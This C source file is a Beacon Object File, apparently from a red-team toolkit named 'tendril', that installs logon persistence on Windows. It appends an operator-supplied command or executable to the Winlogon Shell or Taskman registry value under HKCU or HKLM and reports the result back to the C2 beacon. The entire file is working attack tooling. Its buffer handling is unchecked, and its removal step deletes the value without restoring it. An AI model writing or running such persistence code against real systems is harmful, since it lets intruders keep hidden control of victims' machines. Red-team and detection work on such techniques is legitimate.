/*
 * tendril-winlogon-helper BOF
 * Winlogon Shell/Taskman persistence
 *
 * Arguments (packed):
 *   wstr payload   - command or EXE path
 *   wstr target    - L"Shell" or L"Taskman"
 *   short hive     - 0 = HKCU, 1 = HKLM
 *   short action   - 0 = install, 1 = remove
 */
#include "tendril.h"

#define WINLOGON_PATH L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"

void go(char* args, int alen)
{
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int pLen, tLen;
    wchar_t* payload = (wchar_t*)BeaconDataExtract(&parser, &pLen);
    wchar_t* target  = (wchar_t*)BeaconDataExtract(&parser, &tLen);
    short hive   = BeaconDataShort(&parser);
    short action = BeaconDataShort(&parser);

    HKEY root = (hive == 1) ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;

    if (action == 0) /* install */
    {
        /* For Shell, read current value and append */
        HKEY hKey;
        wchar_t currentVal[1024] = {0};
        DWORD cbData = sizeof(currentVal);
        DWORD type;

        LSTATUS s = ADVAPI32$RegOpenKeyExW(root, WINLOGON_PATH, 0,
            KEY_READ | KEY_WOW64_64KEY, &hKey);

        if (s == ERROR_SUCCESS)
        {
            ADVAPI32$RegQueryValueExW(hKey, target, NULL, &type, (LPBYTE)currentVal, &cbData);
            ADVAPI32$RegCloseKey(hKey);
        }

        wchar_t newVal[2048];
        if (currentVal[0] != 0)
        {
            KERNEL32$lstrcpyW(newVal, currentVal);
            KERNEL32$lstrcatW(newVal, L", ");
            KERNEL32$lstrcatW(newVal, payload);
        }
        else
        {
            KERNEL32$lstrcpyW(newVal, payload);
        }

        s = tendril_reg_set_sz(root, WINLOGON_PATH, target, newVal);
        if (s == ERROR_SUCCESS)
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Winlogon %ls set: %ls", target, newVal);
        else
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed: %d", s);
    }
    else /* remove */
    {
        tendril_reg_delete_value(root, WINLOGON_PATH, target);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Winlogon %ls removed", target);
    }
}
